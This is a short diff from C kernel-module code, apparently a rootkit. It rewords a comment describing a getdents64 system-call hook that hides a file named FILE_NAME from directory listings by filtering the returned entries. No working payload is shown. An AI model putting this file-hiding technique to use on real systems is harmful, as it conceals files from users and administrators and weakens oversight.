@@ -17,8 +17,8 @@ asmlinkage int   getdents64_hook      (unsigned int fd, struct linux_dirent64 *d
 /*
 run the actual system call,
 loop through the struct returned,
-searching each filename (linux_dirent64->d_name)
-with the static constant FILE_NAME,
+compare filename (linux_dirent64->d_name)
+with constant FILE_NAME,
 if it matches recalculating
 what is being returned
 
